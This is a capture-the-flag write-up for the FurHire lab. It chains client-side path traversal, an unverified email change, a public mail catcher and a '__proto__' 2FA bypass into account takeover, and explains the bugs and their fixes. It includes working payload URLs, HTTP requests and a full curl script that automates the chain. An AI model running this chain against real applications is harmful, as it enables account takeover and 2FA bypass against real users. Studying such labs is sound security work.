---
title: FurHire - CSPT to ATO + 2FA Bypass
tags:
  - bugforge
  - cspt
  - account-takeover
  - 2fa-bypass
  - prototype-pollution
  - chain
  - mcp
aliases:
  - "/bugforge/furhire-cspt/"
  - "/BugForge/FurHire---CSPT"
---
- The "is CSPT real impact?" challenge - chain a Client-Side Path Traversal into account takeover, then walk through a prototype-pollution 2FA bypass to land on the flag
- Three primitives stitched together. None of them critical alone. Together they grant full ATO of a recruiter account
- This is the kind of chain that makes CSPT writeups in real bug bounty: GET-only-feeling primitive that quietly turns into a state-changing PUT once you find the right page

## TL;DR

```
support ticket -> bot visits /invite?...&inviteId=../../../account?email=ATTACKER&action=accept
                  -> bot's browser fires PUT /api/account?email=ATTACKER (CSPT)
                  -> bot's email becomes ATTACKER@labs-app.bugforge.io
                  -> trigger /api/account/recover for ATTACKER email
                  -> read reset token from /api/emails (mail catcher)
                  -> reset password
                  -> login with email-as-username
                  -> 2FA: send code:"__proto__" -> bypassed via prototype-chain walk
                  -> JWT in response -> flag
```

## Recon

FurHire is a pet job board. Express SSR with inline `<script>` blocks per page, JWTs in `localStorage`, Socket.io for live notifications. Two roles: `user` (job seeker) and `recruiter` (posts jobs).

### Hint Decode

The challenge whispers: "CSPT is everywhere, but can you demonstrate an impact?" plus a chat hint that the chain involves changing the target's email and then logging in with email-as-username. Reference reading: the [whoareme blog on CSPT -> ATO -> 2FA bypass](https://whoareme.com/blog/cspt-account-takeover-2fa-bypass/).

### Endpoint Map

```
POST /api/register              - mass-assignable (role accepted)
POST /api/login                 - twoFactorRequired returns pendingId
POST /api/2fa/verify            - {pendingId, code}
POST /api/account/recover       - {email}
POST /api/account/reset         - {token, newPassword}
GET  /api/emails                - PUBLIC mail catcher (no auth)
GET  /api/profile               - auth
PUT  /api/profile               - profile blob (bio, location, ...)
PUT  /api/account               - the email-change endpoint
GET  /api/jobs                  - list jobs
GET  /api/jobs/:id              - job detail
GET  /api/jobs/:id/applicants   - recruiter only
POST /api/jobs/:id/apply        - user only
POST /api/companies/:id/invites - recruiter only, returns invite link
PUT  /api/companies/:id/invites/:inviteId  - accept invite (this is the CSPT sink)
POST /api/support/tickets       - {url, description}, bot visits the url
```

### Key Pages and Their Auto-Fired Fetches

Walking the SSR pages and grepping for `fetch(` and `apiRequest(` that fire on page load:

| Page                     | Auto-fetch on load                                                      | Method | URL source         |
| ------------------------ | ----------------------------------------------------------------------- | ------ | ------------------ |
| `/jobs/:id`              | `apiRequest('/api/jobs/'+jobId)`                                        | GET    | path param         |
| `/jobs/:id/applicants`   | `apiRequest('/api/jobs/'+jobId+'/applicants')` and `'/api/jobs/'+jobId` | GET    | path param         |
| `/profile`               | `apiRequest('/api/profile')`                                            | GET    | static             |
| `/dashboard`             | several `apiRequest('/api/...')`                                        | GET    | static             |
| `/email` (mail catcher)  | `fetch('/api/emails')`                                                  | GET    | static             |
| `/invite` (this one!)    | `fetch('/api/companies/'+companyId+'/invites/'+inviteId)`               | GET/PUT | **query params**  |

Every single page does GET-only fetches with **path-param** sources -- except `/invite`, which:

1. Builds the URL from **query params** (so it gladly takes `..` and `/` after URL-decoding)
2. Picks the HTTP method from a **third query param** (`action=accept` -> PUT)
3. Sends with the bot's `Authorization` header

That's the CSPT primitive. The other pages are red herrings that ate hours from the previous attempt.

## Failed Attempt (The Detour)

A first run on this lab parked on the `/jobs/:id` page because the source-rendered `const jobId = '<reflected>';` looked like an obvious XSS / CSPT sink. Three problems killed that path:

1. **HTML entity defense in `<script>` context.** The server HTML-encodes `'` to `&#39;` when reflecting `:id` into the JS string literal. Inside a `<script>` element the HTML parser does **not** decode entities (script content is raw text per HTML5). So `const jobId = 'x&#39;;alert(1)//'` is the literal six-character string `x&#39;;alert(1)//`, not a JS breakout. The defense holds.
2. **Express `:id` is one segment.** A literal `/` in the path makes a different route. `..%2faccount` returns 400 (Express blocks encoded slashes by default).
3. **The auto-fetch on `/jobs/:id` is GET only.** Even with traversal, GETs only let you read; you can't change the bot's email with a GET.

Lesson: when a CSPT sink obviously rejects traversal, **don't keep grinding**. Map every other page that builds fetch URLs from URL state. The exploitable sink is rarely the most obvious one.

## The Real CSPT Primitive

Browsing the recruiter-only `/company` page (which I unlocked via the mass-assignment finding -- see below) revealed an **invite system**. The invite link is shown on the page like this:

```
/invite?companyId=3&inviteId=d795c4f85a9d0f76d470d815ffd291a3&action=accept
```

That `/invite` page loads `/public/js/invite.js`. Here is the entire script:

```javascript
// Team invitation acceptance
(function () {
  function show(message, ok) {
    var el = document.getElementById('invite-status');
    if (!el) return;
    el.textContent = message;
    el.style.borderLeft = '4px solid ' + (ok ? '#2e7d32' : '#c62828');
  }

  document.addEventListener('DOMContentLoaded', function () {
    var token = localStorage.getItem('token');
    if (!token) {
      show('Please log in to view this invitation.', false);
      return;
    }

    var params = new URLSearchParams(window.location.search);
    var companyId = params.get('companyId');
    var inviteId = params.get('inviteId');
    var action = params.get('action') || 'view';

    if (!companyId || !inviteId) {
      show('This invitation link is incomplete.', false);
      return;
    }

    // Build the invitations API path from the link parameters
    var apiPath = '/api/companies/' + companyId + '/invites/' + inviteId;
    var method = (action === 'accept') ? 'PUT' : 'GET';

    fetch(apiPath, {
      method: method,
      headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + token
      }
    })
      .then(/* render result */);
  });
})();
```

Every property of a perfect CSPT sink is here:

| Property                     | Value                                                       |
| ---------------------------- | ----------------------------------------------------------- |
| URL built by string concat   | `'/api/companies/' + companyId + '/invites/' + inviteId`    |
| Both inputs from URL         | `URLSearchParams.get(...)` -- already URL-decoded           |
| Method controlled by URL     | `action === 'accept'` -> PUT, otherwise GET                 |
| Authenticated automatically  | `Authorization: Bearer ${localStorage.token}`               |
| No body                      | the fetch sends headers only                                |
| Auto-fires on page load      | `DOMContentLoaded` handler                                  |

Because `companyId` and `inviteId` come out of `URLSearchParams.get()`, they are **already URL-decoded** by the time they hit the string concat. So `inviteId=..%2F..%2F..%2Faccount` becomes the literal string `../../../account` going into `apiPath`. The browser's URL normalization layer collapses the `..` segments **client-side**, before the request leaves the box. Express never sees a `..`.

## The Body-Less PUT Trick

The only catch: the fetch sends **no body**. PUT `/api/account` with an empty body would normally do nothing useful. So I tested whether the endpoint reads from the query string too:

```http
PUT /api/account?email=test@labs-app.bugforge.io HTTP/1.1
Host: lab-...labs-app.bugforge.io
Authorization: Bearer <attacker>
Content-Type: application/json
```

Response:

```json
{"message":"Account updated","email":"test@labs-app.bugforge.io","full_name":""}
```

Confirmed: `PUT /api/account` reads `email` from the **query string** if the body is empty. Probably a `req.body.email || req.query.email` pattern -- the kind of thing that looks "convenient" in code review. With the CSPT, that means an attacker can put the new email in the same query string that smuggles the path traversal.

## Constructing the Traversal

Given the fetch builds `/api/companies/<companyId>/invites/<inviteId>`, count segments to escape:

```
/api/companies/3/invites/<HERE>
                ^^^^^^^^^^
                three segments to climb (3, invites, then we're at "/")
```

Wait -- the trailing `/` after `invites` doesn't add a segment to climb. So:

| `inviteId`                  | After browser normalization              |
| --------------------------- | ---------------------------------------- |
| `../account`                | `/api/companies/3/account`               |
| `../../account`             | `/api/companies/account`                 |
| `../../../account`          | `/api/account`           ✅              |
| `../../../../account`       | `/account` (no `/api`)                   |

I sanity-checked this with a manual request before bothering the bot:

```http
PUT /api/companies/3/invites/../../../account?email=test3@labs-app.bugforge.io HTTP/1.1
Authorization: Bearer <attacker>
```

```json
{"message":"Account updated","email":"test3@labs-app.bugforge.io","full_name":""}
```

Path traversal works through Caido's normalizer. The browser will do the exact same normalization. Time to weaponize.

## Step-by-Step Walkthrough

### 0. Set the target

```bash
TARGET="https://lab-1781259625170-etjv2m.labs-app.bugforge.io"
```

### 1. Register an attacker user

```http
POST /api/register HTTP/1.1
Content-Type: application/json

{"username":"phant2","password":"Phant2!","email":"phant2@labs-app.bugforge.io"}
```

```json
{"token":"eyJhbGc...","user":{"id":7,"username":"phant2","email":"phant2@labs-app.bugforge.io","role":"user"}}
```

You don't strictly need to be a recruiter for the final attack -- support tickets accept any path. But you'll want a recruiter account to **create the invite that gives you a real `companyId`**, since the bot won't render the page if the company doesn't exist. (A non-existent companyId still triggers the fetch, which is what we actually need; but using a real companyId keeps the page state realistic and avoids edge cases. Either works.)

### 2. (Optional but cleaner) Get a recruiter and create a company

The register endpoint accepts `role` directly -- mass assignment:

```http
POST /api/register HTTP/1.1
Content-Type: application/json

{"username":"phantrec","password":"Phant!","email":"phantrec@labs-app.bugforge.io","role":"recruiter"}
```

```json
{"token":"eyJ...","user":{"id":8,"username":"phantrec","role":"recruiter"}}
```

Create a company so we have a `companyId`:

```http
PUT /api/company HTTP/1.1
Authorization: Bearer <recruiter token>
Content-Type: application/json

{"company_name":"PhantomCorp","industry":"Test","description":"x","location":"x"}
```

Read it back:

```http
GET /api/profile HTTP/1.1
Authorization: Bearer <recruiter token>
```

```json
{"user":{"id":8,...},"company":{"id":3,"recruiter_id":8,"company_name":"PhantomCorp",...}}
```

`companyId = 3`.

### 3. Sanity-check the body-less PUT email change

```http
PUT /api/account?email=sanity@labs-app.bugforge.io HTTP/1.1
Authorization: Bearer <recruiter token>
Content-Type: application/json
```

```json
{"message":"Account updated","email":"sanity@labs-app.bugforge.io","full_name":""}
```

Two facts confirmed in one request:

- Email accepted from query string (no body needed)
- The endpoint accepts ANY email, including the `@labs-app.bugforge.io` suffix that the mail catcher will capture

### 4. Build the support ticket payload

The support form's `url` field accepts paths starting with `/`, blocks `//` (open redirect), and otherwise lets you put query strings and fragments. Here is the payload, with the inviteId carefully URL-encoded:

```
/invite?companyId=3&inviteId=..%2F..%2F..%2Faccount%3Femail%3Dpwned%40labs-app.bugforge.io&action=accept
```

What every piece does:

| Piece                                                              | Effect                                            |
| ------------------------------------------------------------------ | ------------------------------------------------- |
| `/invite`                                                          | Bot's browser navigates here, page loads invite.js |
| `companyId=3`                                                      | Fills the first hole in the apiPath template     |
| `inviteId=..%2F..%2F..%2Faccount%3Femail%3Dpwned%40labs-app.bugforge.io` | Decoded to `../../../account?email=pwned@labs-app.bugforge.io`, then concatenated and normalized to `/api/account?email=pwned@labs-app.bugforge.io` |
| `action=accept`                                                    | Picks PUT method in invite.js                    |

Submit it:

```http
POST /api/support/tickets HTTP/1.1
Authorization: Bearer <attacker token>
Content-Type: application/json

{"url":"/invite?companyId=3&inviteId=..%2F..%2F..%2Faccount%3Femail%3Dpwned%40labs-app.bugforge.io&action=accept","description":"Issue with this invite link"}
```

```json
{"message":"Thanks! A support specialist will review this shortly."}
```

### 5. Wait for the bot

The support bot is a logged-in recruiter who Puppeteer-style visits the url field of every ticket. Give it ~20-30 seconds.

Behind the scenes:

```
bot navigates to /invite?...
bot's invite.js runs:
  apiPath = '/api/companies/3/invites/' + '../../../account?email=pwned@labs-app.bugforge.io'
          = '/api/companies/3/invites/../../../account?email=pwned@labs-app.bugforge.io'
  method  = 'PUT' (because action === 'accept')
  fetch(apiPath, {method, headers: {Authorization: 'Bearer ' + bot_token}})
browser URL normalization:
  /api/companies/3/invites/../../../account?email=...
  -> /api/account?email=pwned@labs-app.bugforge.io
server: PUT /api/account?email=pwned@labs-app.bugforge.io with bot's Authorization header
server response: bot's email is now pwned@labs-app.bugforge.io
```

### 6. Trigger password recovery for the new email

```http
POST /api/account/recover HTTP/1.1
Content-Type: application/json

{"email":"pwned@labs-app.bugforge.io"}
```

```json
{"message":"If that email is registered, a reset link has been sent."}
```

The non-committal response is fine. The mail catcher will tell us the truth.

### 7. Read the reset token from the public mail catcher

```http
GET /api/emails HTTP/1.1
```

```json
[{"to":"pwned@labs-app.bugforge.io","subject":"Reset your FurHire password",
  "body":"... Use this link to choose a new one: /reset?token=7fe14c2d276c6d61edb3cb165be805f1"}]
```

The mail catcher requires no auth. Anyone -- attacker or any other lab visitor -- can read every captured email.

### 8. Reset the bot's password

```http
POST /api/account/reset HTTP/1.1
Content-Type: application/json

{"token":"7fe14c2d276c6d61edb3cb165be805f1","newPassword":"PhantomPwn123!"}
```

```json
{"message":"Password updated. You can now sign in."}
```

### 9. Login with email-as-username

We don't know the bot's username -- but per the chat hint, login accepts an email in the username field:

```http
POST /api/login HTTP/1.1
Content-Type: application/json

{"username":"pwned@labs-app.bugforge.io","password":"PhantomPwn123!"}
```

```json
{"twoFactorRequired":true,"pendingId":"cf458dc19ebf3408e661b59a"}
```

Two-factor required. We don't have the bot's phone. **But we have prototype pollution.**

### 10. 2FA bypass via prototype chain

The 2FA verifier checks `pendingCodes[code]` for truthiness without `Object.hasOwn`. That means inherited properties of `Object.prototype` count -- and `__proto__` is the most useful one because `({})['__proto__']` returns the prototype object itself, which is truthy.

```http
POST /api/2fa/verify HTTP/1.1
Content-Type: application/json

{"pendingId":"cf458dc19ebf3408e661b59a","code":"__proto__"}
```

```json
{
  "token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJwYXdzaXRpdmVfaHIiLCJyb2xlIjoicmVjcnVpdGVyIiwidHdvZmEiOnRydWUsImlhdCI6MTc4MTI2NTMwOH0...",
  "user":{
    "id":4,
    "username":"pawsitive_hr",
    "email":"pwned@labs-app.bugforge.io",
    "full_name":"bug{59mwlBqL7m3KcJgGyFsiKdSC3ucSw8Qk}",
    "role":"recruiter"
  },
  "flag":"bug{59mwlBqL7m3KcJgGyFsiKdSC3ucSw8Qk}"
}
```

Done. The flag is right there in the response, and the JWT in the response would let us continue impersonating `pawsitive_hr` indefinitely.

Other prototype keys that work (in case `__proto__` is filtered): `constructor`, `toString`, `valueOf`, `hasOwnProperty`, `isPrototypeOf`. All are inherited and all are truthy.

## Attack Chain Diagram

```
[1] attacker submits support ticket
     url=/invite?companyId=3&inviteId=..%2F..%2F..%2Faccount%3Femail%3Dpwned%40labs-app.bugforge.io&action=accept
                |
                v
[2] bot (recruiter pawsitive_hr) visits the URL
                |
                v
[3] /public/js/invite.js runs in bot's browser:
      fetch('/api/companies/3/invites/../../../account?email=pwned@...', {method:'PUT', Auth: bot_token})
                |
                v
[4] browser URL-normalizes to:
      PUT /api/account?email=pwned@labs-app.bugforge.io
      (with bot's Authorization header)
                |
                v
[5] server: bot's email is now pwned@labs-app.bugforge.io
                |
                v
[6] attacker: POST /api/account/recover {email: pwned@...}
[7] attacker: GET  /api/emails  -> reset token (no auth required)
[8] attacker: POST /api/account/reset {token, newPassword}
[9] attacker: POST /api/login   {username: pwned@..., password}  -> 2FA challenge
[10] attacker: POST /api/2fa/verify {pendingId, code: "__proto__"}  -> JWT + flag
```

## TL;DR Speedrun

```bash
TARGET="https://lab-XXXXX.labs-app.bugforge.io"
ATK_EMAIL="pwned@labs-app.bugforge.io"

# 1. Register attacker
TOK=$(curl -sk -X POST "$TARGET/api/register" -H 'Content-Type: application/json' \
  -d '{"username":"phant2","password":"P!","email":"phant2@labs-app.bugforge.io"}' \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

# 2. (Optional) Make a real company so companyId exists
RTOK=$(curl -sk -X POST "$TARGET/api/register" -H 'Content-Type: application/json' \
  -d '{"username":"phantrec","password":"P!","email":"phantrec@labs-app.bugforge.io","role":"recruiter"}' \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")
curl -sk -X PUT "$TARGET/api/company" -H "Authorization: Bearer $RTOK" -H 'Content-Type: application/json' \
  -d '{"company_name":"PhantomCorp","industry":"x","description":"x","location":"x"}' >/dev/null
CID=$(curl -sk -H "Authorization: Bearer $RTOK" "$TARGET/api/profile" | python3 -c "import sys,json;print(json.load(sys.stdin)['company']['id'])")

# 3. Send the CSPT via support ticket
URL="/invite?companyId=${CID}&inviteId=..%2F..%2F..%2Faccount%3Femail%3D${ATK_EMAIL//@/%40}&action=accept"
curl -sk -X POST "$TARGET/api/support/tickets" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
  -d "{\"url\":\"$URL\",\"description\":\"broken invite\"}"

# 4. Wait for bot
sleep 30

# 5. Recover -> read mail catcher -> reset
curl -sk -X POST "$TARGET/api/account/recover" -H 'Content-Type: application/json' \
  -d "{\"email\":\"$ATK_EMAIL\"}"
RESET_TOK=$(curl -sk "$TARGET/api/emails" | python3 -c "import sys,json,re;d=json.load(sys.stdin);print(re.search(r'token=([a-f0-9]+)', [m for m in d if m['to']=='${ATK_EMAIL}'][-1]['body']).group(1))")
curl -sk -X POST "$TARGET/api/account/reset" -H 'Content-Type: application/json' \
  -d "{\"token\":\"$RESET_TOK\",\"newPassword\":\"Pwned!1\"}"

# 6. Login (email as username) and bypass 2FA via prototype walk
PID=$(curl -sk -X POST "$TARGET/api/login" -H 'Content-Type: application/json' \
  -d "{\"username\":\"$ATK_EMAIL\",\"password\":\"Pwned!1\"}" \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['pendingId'])")
curl -sk -X POST "$TARGET/api/2fa/verify" -H 'Content-Type: application/json' \
  -d "{\"pendingId\":\"$PID\",\"code\":\"__proto__\"}"
```

## Why This Worked - The Three Bugs

This was a chain. Each bug alone is a lower severity than the chain.

### Bug 1: CSPT in `/public/js/invite.js`

- `companyId` and `inviteId` from `URLSearchParams.get()` are concatenated into a fetch URL
- `URLSearchParams` decodes `%2F` -> `/` before returning the value, so the developer's mental model ("it's a single id") is broken: a `..%2F` payload escapes the segment
- The fetch method is also URL-controlled (`action=accept` -> PUT)
- The fetch carries the victim's bearer token but **no body**
- CWE-22 (Path Traversal) plus CWE-918 (SSRF-style behaviour, but client-side)

### Bug 2: `PUT /api/account` reads from query string

- Likely `const email = req.body.email || req.query.email`
- Body-less CSPT primitives become real state changes
- The fact that this endpoint accepts ANY email (no verification email, no current password) makes it a single-shot ATO target
- CWE-862 (Missing Authorization) + CWE-269 (no re-auth gate on email change)

### Bug 3: 2FA verify checks `pendingCodes[code]` without `Object.hasOwn`

- `if (pendingCodes[code]) { /* accept */ }` walks the prototype chain
- Truthy values come back for `__proto__`, `constructor`, `toString`, `valueOf`, `hasOwnProperty`, `isPrototypeOf`
- Server-side prototype-chain confusion -- not the same as Object.prototype POLLUTION, but the same root cause: object lookups don't differentiate own vs inherited properties
- CWE-1321 (Prototype Pollution-class) -- specifically the "lookup confusion" variant

### Supporting: Mass-assignment of `role` at registration

- `POST /api/register` with `role: "recruiter"` works -- granted me access to `/company` to discover the invite system and get a real companyId for the chain
- Severity-on-its-own: medium (privilege escalation, not direct ATO)

### Supporting: Public mail catcher with no scoping

- `GET /api/emails` is unauthenticated and global
- Lab affordance, but the same anti-pattern exists in real apps as "debug" or "internal" routes left exposed

## Lessons

1. **The first sink you find isn't always THE sink.** I burned an hour grinding `<script>const jobId='X';</script>` reflections and HTML-entity escapes. The exploitable CSPT was on a different page entirely, behind a recruiter-only flow. Always map every fetch URL builder before committing to one.

2. **HTML entities are NOT decoded inside `<script>` elements.** This is a common XSS dead end. Per the HTML5 spec, `<script>` content is raw text -- `&#39;` stays literal. If a server reflects user input into JS via HTML-entity encoding, that's actually a defense, not a bypass.

3. **`URLSearchParams.get()` already URL-decodes.** That means CSPT payloads delivered via query string get to skip the "is `/` allowed in this position" question that path-param CSPT runs into. Whenever you see `URLSearchParams` feeding string concatenation, look for traversal.

4. **Body-less PUT/POST endpoints are weaponizable when servers `||` between body and query.** The classic GET-only CSPT escalates to a state change as soon as the target endpoint reads from `req.query`. Always test both.

5. **`Object.hasOwn` is the difference between safe and exploitable.** Any property lookup `obj[userInput]` that decides on truthiness without `Object.hasOwn` (or `Object.prototype.hasOwnProperty.call`) walks the prototype chain. That includes 2FA codes, OAuth states, password reset tokens -- all of them.

6. **Public test-mode features pair badly with email-mutation primitives.** A mail catcher that captures every `@labs-app.bugforge.io` email is fine in isolation. Combined with an unverified email change, it becomes a one-step token-leak channel.

## Remediation

- **invite.js**: stop building URLs from string concat. Use `URL` API with strict input validation: reject `inviteId` if it contains `/` or `..`. Better: change the route to a fixed RPC endpoint `POST /api/invites/accept` that takes `{companyId, inviteId}` in the body, no path manipulation possible.
- **PUT /api/account**: drop `req.query.email`. State changes from query strings are CSRF-friendly by accident. Require the body. Require current password OR a verification email round-trip for email changes.
- **2FA**: change `if (pendingCodes[code])` to `if (Object.hasOwn(pendingCodes, code) && pendingCodes[code] === expected)`. Always validate the code matches the expected value, not just truthy. Use a `Map` instead of a plain object.
- **Mail catcher**: at minimum, scope it to the authenticated user's emails. In a real app, no public mail catcher.
- **Register**: explicit allowlist of permitted fields. `role` should never be settable by the client.
